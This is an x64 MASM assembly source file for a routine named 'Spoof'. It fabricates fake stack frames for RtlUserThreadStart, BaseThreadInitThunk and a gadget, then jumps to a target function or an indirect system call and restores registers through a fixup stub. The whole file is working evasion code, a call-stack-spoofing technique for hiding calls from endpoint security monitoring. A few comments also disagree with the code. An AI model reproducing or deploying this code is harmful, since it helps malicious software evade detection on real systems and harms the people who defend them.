Spoof proto
Setup proto
NtWait proto
.code

Spoof proc
    pop     rax             ; Real return address
    mov     r10, rdi        ; Original r10 in rdi
    mov     r11, rsi        ; Oritingal r11 in rs
    mov     rdi, [rsp + 20h] ; Rdi = &Params
    mov     rsi, [rsp + 28h] ; Rsi = target function
    
    ; Storing original registers
    mov [rdi + 48h], rbx
    mov [rdi + 50h], r10
    mov [rdi + 58h], r11
    mov [rdi + 60h], r12
    mov [rdi + 68h], r13
    mov [rdi + 70h], r14
    mov [rdi + 78h], r15

    mov [rdi + 10h], rax    ; Preserve original return address

    ; Calculate spoof meta-frame size
    xor r11, r11            ; To hold number of pushed args
    mov r12, [rsp + 30h]    ; r12 = number of stack args
    mov r14, 200h           ; r14 = push offset
    add r14, 8    
    add r14, [rdi + 18h]    ; + Param->BaseThreadInitFrameSize
    add r14, [rdi + 28h]    ; + Param->RtlUserThreadStartFrameSize
    add r14, [rdi + 38h]    ; + Param->GadgetFrameSize
    sub r14, 20h            ; Subtract shadow space
    mov r12, [rdi + 10h]    ; Return address back to r12 (so its not just hanging out on the stack)
    mov qword ptr [rdi + 10h], 0

    mov r10, rsp            ; 
    add r10, 30h            ; r10 = rsp + 30h (argument 7 of Spoof)

stack_var_loop:
    xor r15, r15        ; r15 = offset + rsp base
    cmp r11, r13        ; Comparing number of stack args vs number still needed
    je finish

    ; Get location to move the stack argument to
    sub r14, 8          ; 1 arg means r11 is 0, ra4 already 28h offset
    mov r15, rsp        ; get current stack base
    sub r15, r14        ; subtract offset

    ; Get and push current stack arg
    add r10, 8
    push [r10]
    pop [r15]

    ; Increment and loop in case we need more args
    inc r11
    jmp stack_var_loop
finish:

    ; Create a big 320 byte working space
    sub rsp, 200h

    ; Push a 0 to cut off the return address after RtlUserThreadStart
    push 0

    ; Create RtlUserThreadStart + 14h frame
    sub rsp, [rdi + 28h]
    mov r11, [rdi + 30h]
    mov [rsp], r11

    ; BaseThreadInitThunk + 21h frame
    sub rsp, [rdi + 18h]
    mov r11, [rdi + 20h]
    mov [rsp], r11

    ; Gadget frame
    sub rsp, [rdi + 38h]
    mov r11, [rdi + 8]
    mov [rsp], r11
    
    ; Adjusting the param struct for the fixup
    mov r11, rsi                ; Copying function to call into r11
    mov [rdi + 10h], r12        ; Real return address now stored in Param->OriginalReturnAddress
    lea rbx, [fixup]            ; Fixup address in rbx
    mov [rdi], rbx              ; Param->FixupAddress = fixup
    mov rbx, rdi                ; rbx = address of Param

    ; In case of syscall
    mov r10, rcx
    mov r12, rax
    mov rax, [rdi + 40h]        ; rax = Param->SystemCallNumber
    jmp r11

fixup:
    mov     rcx, rbx
    ; Restore original stack frame
    add rsp, 200h
    add rsp, [rbx + 38h]
    add rsp, [rbx + 18h]
    add rsp, [rbx + 28h]
    mov rdx, r12                ; Get return address from r12 before reseting it

    ; Restore nonvolatiles
    mov rbx, [rcx + 48h]
    mov rdi, [rcx + 50h]
    mov rsi, [rcx + 58h]
    mov r12, [rcx + 60h]
    mov r13, [rcx + 68h]
    mov r14, [rcx + 70h]
    mov r15, [rcx + 78h]

    ; Return from Spoof
    jmp rdx
Spoof endp

end
